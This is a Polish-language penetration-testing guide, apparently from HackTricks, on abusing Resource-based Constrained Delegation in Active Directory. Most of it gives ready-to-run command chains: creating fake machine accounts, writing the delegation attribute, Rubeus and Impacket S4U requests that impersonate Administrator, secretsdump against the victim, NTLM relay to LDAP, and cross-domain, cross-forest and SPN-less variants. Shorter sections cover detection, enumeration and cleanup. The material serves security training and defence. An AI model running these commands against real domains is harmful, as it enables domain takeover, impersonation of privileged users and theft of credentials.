# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Basics of Resource-based Constrained Delegation

Jest to podobne do podstawowego [Constrained Delegation](constrained-delegation.md), ale **zamiast** nadawać **obiektowi** uprawnienia do **impersonate dowolnego użytkownika względem maszyny**, Resource-based Constrain Delegation **ustawia** w **obiekcie informację, kto może impersonate dowolnego użytkownika względem niego**.

W tym przypadku obiekt objęty ograniczeniem będzie miał atrybut o nazwie _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ zawierający nazwę użytkownika, który może impersonate dowolnego innego użytkownika względem tego obiektu.

Kolejną ważną różnicą między tą formą Constrained Delegation a pozostałymi delegacjami jest to, że każdy użytkownik z **uprawnieniami zapisu do konta maszyny** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) może ustawić wartość **_msDS-AllowedToActOnBehalfOfOtherIdentity_** (w pozostałych formach Delegation potrzebne były uprawnienia domain admin).

### New Concepts

W przypadku Constrained Delegation wspomniano, że flaga **`TrustedToAuthForDelegation`** w wartości _userAccountControl_ użytkownika jest wymagana do wykonania operacji **S4U2Self.** Nie jest to jednak całkowicie prawdą.\
W rzeczywistości nawet bez tej wartości można wykonać **S4U2Self** względem dowolnego użytkownika, jeśli jest się **service** (ma się SPN), ale jeśli **ma się `TrustedToAuthForDelegation`**, zwrócony TGS będzie **Forwardable**, a jeśli nie ma się tej flagi, zwrócony TGS **nie będzie** **Forwardable**.

Jeśli jednak **TGS** użyty w **S4U2Proxy** jest **NOT Forwardable**, próba wykorzystania **basic Constrain Delegation** **nie zadziała**. Jeśli jednak próbujesz wykorzystać Resource-Based constrain delegation, zadziała.

### Attack structure

> Jeśli masz **write equivalent privileges** do konta **Computer**, możesz uzyskać **privileged access** na tej maszynie.

Załóżmy, że attacker ma już **write equivalent privileges do komputera ofiary**.

1. Attacker **compromises** konto, które ma **SPN**, lub **tworzy takie konto** („Service A”). Należy pamiętać, że dowolny _Admin User_ bez żadnych innych specjalnych uprawnień może **utworzyć maksymalnie 10 obiektów Computer** (**_MachineAccountQuota_**) i ustawić im **SPN**. Attacker może więc po prostu utworzyć obiekt Computer i ustawić SPN.
2. Attacker **nadużywa swojego uprawnienia WRITE** do komputera ofiary (ServiceB), aby skonfigurować **resource-based constrained delegation** i zezwolić ServiceA na impersonate dowolnego użytkownika względem tego komputera ofiary (ServiceB).
3. Attacker używa Rubeus do wykonania **pełnego ataku S4U** (S4U2Self i S4U2Proxy) z Service A do Service B dla użytkownika mającego **privileged access do Service B**.
1. S4U2Self (z konta ze skompromitowanym/utworzonym SPN): Poproś o **TGS użytkownika Administrator do mnie** (Not Forwardable).
2. S4U2Proxy: Użyj **nie-Forwardable TGS** z poprzedniego kroku, aby poprosić o **TGS** od **Administrator** do **hosta ofiary**.
3. Nawet jeśli używasz nie-Forwardable TGS, ponieważ wykorzystujesz Resource-based constrained delegation, zadziała.
4. Attacker może wykonać **pass-the-ticket** i **impersonate** użytkownika, aby uzyskać **dostęp do ServiceB ofiary**.

Aby sprawdzić _**MachineAccountQuota**_ domeny, możesz użyć:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Atak

### Tworzenie obiektu komputera

Możesz utworzyć obiekt komputera w domenie za pomocą **[powermad](https://github.com/Kevin-Robertson/Powermad):**
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Konfigurowanie Resource-based Constrained Delegation

**Using activedirectory PowerShell module**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Using powerview**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Wykonywanie kompletnego ataku S4U (Windows/Rubeus)

Najpierw utworzyliśmy nowy obiekt Computer z hasłem `123456`, więc potrzebujemy hasha tego hasła:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Spowoduje to wyświetlenie hashy RC4 i AES dla tego konta.\
Teraz można przeprowadzić atak:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Możesz wygenerować więcej ticketów dla większej liczby usług, prosząc tylko raz, używając parametru `/altservice` narzędzia Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Pamiętaj, że użytkownicy mają atrybut o nazwie "**Cannot be delegated**". Jeśli ten atrybut użytkownika ma wartość True, nie będzie można się pod niego podszyć. Właściwość tę można zobaczyć w BloodHound.

### Linux tooling: RBCD od początku do końca z użyciem Impacket (2024+)

Jeśli pracujesz z systemu Linux, możesz wykonać cały łańcuch RBCD za pomocą oficjalnych narzędzi Impacket:
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Notatki
- Jeśli wymuszane jest podpisywanie LDAP/LDAPS, użyj `impacket-rbcd -use-ldaps ...`.
- Preferuj klucze AES; wiele nowoczesnych domen ogranicza RC4. Impacket i Rubeus obsługują przepływy tylko z AES.
- Impacket może przepisać `sname` ("AnySPN") dla niektórych narzędzi, ale zawsze, gdy to możliwe, uzyskaj poprawny SPN (np. CIFS/LDAP/HTTP/HOST/MSSQLSvc).

## RBCD między domenami i lasami

Jeśli kontrolowany przez Ciebie **delegating principal** znajduje się w **innej domenie** (lub nawet w **innym lesie**) niż **resource computer**, nadużycie nadal jest **RBCD**, ale przepływ biletu nie jest już typowym `S4U2Self -> S4U2Proxy` w jednej domenie.

### RBCD między domenami: skonfiguruj foreign principal przy użyciu SID

Gdy ustawiasz `msDS-AllowedToActOnBehalfOfOtherIdentity` z **innej domeny**, foreign machine/user może **nie być możliwy do rozwiązania po nazwie** w LDAP docelowej domeny. W takim przypadku skonfiguruj wpis delegacji przy użyciu **SID** foreign principal zamiast jego sAMAccountName/UPN.

Jest to szczególnie istotne podczas przekazywania NTLM do LDAP za pomocą `ntlmrelayx.py`:
```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
--no-dump --no-da --no-validate-privs \
--delegate-access \
--escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
--sid
```
Uwagi:
- `--sid` mówi `ntlmrelayx.py`, aby traktował `--escalate-user` jako SID, co jest wymagane, gdy konto delegujące pochodzi z innej domeny niż docelowa.
- Nawet jeśli narzędzie wyświetli `User not found in LDAP`, zapis delegacji może się powieść, ponieważ security descriptor przechowuje obcy SID bezpośrednio.

### RBCD między domenami: sekwencja cross-realm S4U

Gdy foreign principal znajduje się już w `msDS-AllowedToActOnBehalfOfOtherIdentity`, działający przepływ między domenami wygląda następująco:

1. Uzyskaj **TGT** dla delegating principal z jego własnej domeny.
2. Zażądaj **referral TGT** dla `krbtgt/<target-domain>`.
3. Zażądaj **cross-realm S4U2Self referral** dla impersonated user na kontrolerze domeny docelowej.
4. Zażądaj właściwego biletu **S4U2Self** dla tego użytkownika z powrotem w domenie delegatora.
5. Wykonaj **S4U2Proxy** w domenie delegatora, aby uzyskać referral ticket dla domeny docelowej.
6. Wykonaj końcowe **S4U2Proxy** na kontrolerze domeny docelowej, aby uzyskać service ticket dla `cifs/host.target`, `host/host.target` itd.

To wyjaśnia, dlaczego standardowe narzędzia Linux często zawodzą w przypadku RBCD między domenami:
- request **realm** może wymagać wartości różnej od realm TGT użytego w `TGS-REQ`
- łańcuch wymaga **niezależnych kroków S4U2Proxy**, a nie tylko `S4U2Self` lub `S4U2Self` bezpośrednio połączonego z pojedynczym `S4U2Proxy`

### RBCD między domenami z systemu Linux

Synacktiv opublikował implementację Impacket `getST.py`, która odtwarza sekwencję cross-realm z systemu Linux, jawnie obsługując oba KDC:
```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
-dc-ip 192.168.90.131 \
-targetdc 192.168.90.217 \
-targetdomain asgard.local \
-impersonate thor_adm \
-spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
-k -no-pass -dc-ip 192.168.90.217
```
W praktyce nowe argumenty to:
- `-dc-ip`: DC domeny **delegującej**
- `-targetdomain`: domena **resource computer**
- `-targetdc`: DC domeny **resource**

### Ograniczenia Cross-forest RBCD

Cross-forest RBCD ma istotne ograniczenie: **impersonated user musi należeć do tego samego forest co delegating principal**. Innymi słowy, jeśli kontrolowane konto maszyny znajduje się w `valhalla.local`, a docelowy resource znajduje się w `asgard.local`, zasadniczo **nie można impersonate dowolnych użytkowników `asgard.local` na tym resource za pomocą RBCD**.

Nadal jest to exploitable, gdy:
- użytkownik z **delegating forest** jest **local admin** (lub ma inne uprawnienia) na hoście resource w drugim forest
- trust zezwala na wymaganą ścieżkę uwierzytelniania, a foreign SID jest akceptowany w security descriptorze docelowego komputera

### Dziwactwa protokołu Cross-forest RBCD

Cross-forest RBCD to nie tylko „cross-domain plus trust”. Zaobserwowany flow obejmuje dwa dziwactwa, które historycznie były pomijane przez popularne narzędzia:

1. Dodatkowe żądanie **S4U2Proxy**, które ustawia **`PA-PAC-OPTIONS=branch-aware`**
2. Finalny service ticket, który może zostać zwrócony z użyciem **RC4**, nawet gdy żądano innych etypes

Praktyczny flow wygląda następująco:

1. Uzyskaj TGT dla delegating principal w forest A.
2. Zażądaj **S4U2Self** dla impersonated user w forest A.
3. Zażądaj **S4U2Proxy** w forest A, aby uzyskać referral TGT dla forest B.
4. Wyślij drugie **S4U2Proxy** w forest A **bez ticketu S4U2Self jako additional ticket**, ale z włączonym `branch-aware`, aby uzyskać kolejny referral TGT dla forest B.
5. Opcjonalnie zażądaj normalnego service ticketu w forest B dla delegating principal (ten ticket nie jest wymagany do finalnego abuse).
6. Użyj referral tickets z kroków 3 i 4, aby zażądać finalnego ticketa **S4U2Proxy** w forest B dla impersonated user z forest A do docelowego SPN.

### Cross-forest RBCD z Linuxa

Ta sama gałąź Synacktiv Impacket dodaje przełącznik `-forest` dla tej logiki:
```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
-impersonate 'v_thor' \
-dc-ip VALHALLA.local \
valhalla.local/'desktop$' \
-targetdc ASGARD.local \
-targetdomain asgard.local \
-aesKey 4[...]f \
-forest
```
### Rekursywne RBCD w wielu domenach (3+ domen)

W **lasach obejmujących wiele domen** zarówno **S4U2Self**, jak i **S4U2Proxy** mogą działać **rekursywnie**, zamiast zatrzymywać się po jednym przekierowaniu:

- **Rekursywne S4U2Self**: pierwsze żądanie `S4U2Self` jest wysyłane do **domeny podszywanego użytkownika**, pośrednie przejścia między domeną nadrzędną i podrzędną są realizowane za pomocą normalnych przekierowań `TGS-REQ` dla `krbtgt/<REALM>`, a **końcowe `S4U2Self`** jest wysyłane we **własnej domenie delegującego principal**.
- Oznacza to, że **samo posiadanie TGT** dla konta komputera może wystarczyć do podszycia się pod **admina z innej domeny w tym samym lesie** i zażądania `cifs/host`, `host/host`, `wsman/host` itd.
- **Rekursywne S4U2Proxy** podąża za łańcuchem zaufania w ten sam sposób: pośrednie przejścia ponownie wykorzystują poprzedni bilet jako TGT podczas żądania kolejnego przekierowania `krbtgt/<REALM>`, a tylko ostatni etap zwraca końcowy bilet usługi.

Praktyczny przykład w tym samym lesie:
```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
-impersonate Administrator@frperso.local -self \
-altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```
### SPN-less cross-domain / cross-forest RBCD

Jeśli **delegating principal jest użytkownikiem bez SPN**, ostatni rekurencyjny `S4U2Self` kończy się błędem **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**. Obejściem jest **ponowienie wyłącznie ostatniego hopu jako `S4U2Self+U2U`**.

Skrócona wersja chainu abuse:

1. Uwierzytelnij się za pomocą **NT hash**, aby skierować KDC w stronę **RC4-HMAC (etype 23)**.
2. Najpierw wykonaj żądanie **`-self -u2u`** i zachowaj ten ticket oddzielnie od późniejszego kroku proxy.
3. Wyodrębnij klucz sesji **TGT** za pomocą `describeTicket.py`.
4. Zastąp **NT hash** użytkownika tym **kluczem sesji**, używając `changepasswd.py -newhashes <session_key>`.
5. Wykorzystaj ponownie ticket `S4U2Self+U2U` jako **`-additional-ticket`** podczas oddzielnego żądania **`-proxy`**.
```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
-impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
-hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
-impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
-spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```
Uwagi operacyjne:

- Gdy **pierwszy zaufany przeskok prowadzi już do innego lasu**, preferuj algorytm **branch-aware** (`getST.py ... -forest`), aby dopasować zachowanie natywnego systemu Windows. Jeśli obcy las jest osiągany dopiero później w łańcuchu, nierekurencyjny przepływ nieuwzględniający gałęzi może nadal działać.
- Na nowszych kontrolerach domeny **Windows Server 2022/2025** wymuszone RC4 może zakończyć się błędem **`KDC_ERR_ETYPE_NOSUPP`** z powodu wycofywania RC4; może to uniemożliwić **RBCD bez SPN**, mimo że klasyczne RBCD oparte na SPN nadal działa z AES.
- Uruchom **`S4U2Self+U2U` przed zmianą skrótu/hasła użytkownika**: **`SamrChangePasswordUser`** nie przelicza kluczy AES Kerberos konta, dlatego wcześniejsza zmiana hasła może przerwać późniejsze żądania biletów.
- Konto, którego tożsamość jest impersonowana, nadal musi być **delegowalne**: **Protected Users** oraz konta z flagą **`NOT_DELEGATED`** / opcją **„Account is sensitive and cannot be delegated”** blokują łańcuch.

## Uwagi dotyczące wykrywania / hardeningu

- Ścieżki RBCD między domenami/lasami nadal są zwykle tworzone przez **nadużycie ACL** lub **relay-to-LDAP**. Wymuś **LDAP signing** i **LDAP channel binding** na kontrolerach domeny, aby przerwać typowe ścieżki konfiguracji.
- Sprawdź, kto może zapisywać atrybut **`msDS-AllowedToActOnBehalfOfOtherIdentity`** na obiektach komputerów, i rozwiąż zapisane identyfikatory SID, w tym **foreign security principals**.
- W środowiskach z dużą liczbą trustów przeanalizuj **Selective Authentication**, **SID filtering** oraz to, czy użytkownicy z obcego lasu mają uprawnienia **local admin** na hostach zasobów.

### Uzyskiwanie dostępu

Ostatni wiersz polecenia wykona **kompletny atak S4U i wstrzyknie TGS** od Administratora do hosta ofiary w **pamięci**.\
W tym przykładzie zażądano TGS dla usługi **CIFS** od Administratora, więc uzyskasz dostęp do **C$**:
```bash
ls \\victim.domain.local\C$
```
### Nadużywanie różnych service tickets

Dowiedz się więcej o [**dostępnych service tickets tutaj**](silver-ticket.md#available-services).

## Enumerowanie, audytowanie i czyszczenie

### Enumerowanie komputerów ze skonfigurowanym RBCD

PowerShell (dekodowanie SD w celu rozwiązania SID-ów):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (odczyt lub wyczyszczenie za pomocą jednego polecenia):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Cleanup / reset RBCD

- PowerShell (clear the attribute):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Błędy Kerberos

- **`KDC_ERR_ETYPE_NOTSUPP`**: Oznacza to, że Kerberos jest skonfigurowany tak, aby nie używać DES ani RC4, a Ty dostarczasz tylko hash RC4. Dostarcz do Rubeus co najmniej hash AES256 (albo po prostu dostarcz hashe rc4, aes128 i aes256). Przykład: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** podczas `-self` dla zwykłego użytkownika: delegating principal prawdopodobnie **nie ma SPN**. Ponów **ostatni hop** jako **`S4U2Self+U2U`** zamiast zwykłego **`S4U2Self`**.
- **`KDC_ERR_ETYPE_NOSUPP`** podczas **SPN-less RBCD**: najnowsze DC mogą odrzucać wymuszaną ścieżkę **RC4-HMAC**, wymaganą przez trik **`S4U2Self+U2U` + session-key-substitution**. Zamiast tego wypróbuj klasyczną ścieżkę RBCD opartą na **SPN**, używając AES.
- **`KRB_AP_ERR_SKEW`**: Oznacza to, że czas bieżącego komputera różni się od czasu DC i Kerberos nie działa prawidłowo.
- **`preauth_failed`**: Oznacza to, że podana kombinacja username + hashy nie działa podczas logowania. Możliwe, że zapomniałeś umieścić znak "$" w username podczas generowania hashy (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Może to oznaczać:
- Użytkownik, którego próbujesz impersonate, nie może uzyskać dostępu do żądanej usługi (ponieważ nie możesz go impersonate albo nie ma wystarczających uprawnień)
- Żądana usługa nie istnieje (jeśli żądasz ticketu dla winrm, ale winrm nie działa)
- Utworzony fakecomputer utracił uprawnienia do podatnego serwera i musisz przyznać mu je ponownie.
- Nadużywasz klasycznego KCD; pamiętaj, że RBCD działa z ticketami S4U2Self bez flagi forwardable, podczas gdy KCD wymaga ticketów forwardable.

## Uwagi, relaye i alternatywy

- Możesz również zapisać RBCD SD przez AD Web Services (ADWS), jeśli LDAP jest filtrowany. Zobacz:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Łańcuchy Kerberos relay często kończą się na RBCD, aby jednym krokiem uzyskać local SYSTEM. Zobacz praktyczne przykłady end-to-end:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Jeśli LDAP signing/channel binding są **wyłączone** i możesz utworzyć machine account, narzędzia takie jak **KrbRelayUp** mogą przekazać wymuszone uwierzytelnianie Kerberos do LDAP, ustawić `msDS-AllowedToActOnBehalfOfOtherIdentity` dla Twojego machine account na obiekcie docelowego komputera, a następnie natychmiast impersonate **Administrator** przez S4U z off-host.

## Referencje

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- Impacket rbcd.py (official): https://github.com/fortra/impacket/blob/master/examples/rbcd.py
- Quick Linux cheatsheet with recent syntax: https://tldrbins.github.io/rbcd/
- [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [Synacktiv - Exploring cross-domain & cross-forest RBCD](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [Synacktiv - Exploring cross-domain & cross-forest RBCD: part 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [Synacktiv Impacket branch - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [Microsoft Learn - Kerberos constrained delegation overview](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [Microsoft Open Specifications - Cross-domain S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [Microsoft Learn - Detect and remediate RC4 usage in Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)


{{#include ../../banners/hacktricks-training.md}}
